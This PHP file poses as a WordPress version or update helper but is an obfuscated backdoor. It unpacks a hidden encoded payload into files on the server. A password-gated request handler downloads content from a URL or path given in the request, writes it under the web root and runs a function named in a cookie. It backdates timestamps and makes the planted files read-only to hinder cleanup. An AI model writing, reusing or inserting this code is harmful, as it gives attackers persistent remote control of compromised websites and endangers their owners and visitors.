<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y2uioJHiL29xMKA0LJpipUIvoTywK2u0oJjiqT9lpzIhqP5wo2Eyp3EuM2HhoTfiq3NgnJ5woUIxMKZinJ1uM2ImY2AioJ1iov5xLKD', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("vlr{$check}yg", 'e76aebafaa684d819f3daeaea2352974')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}
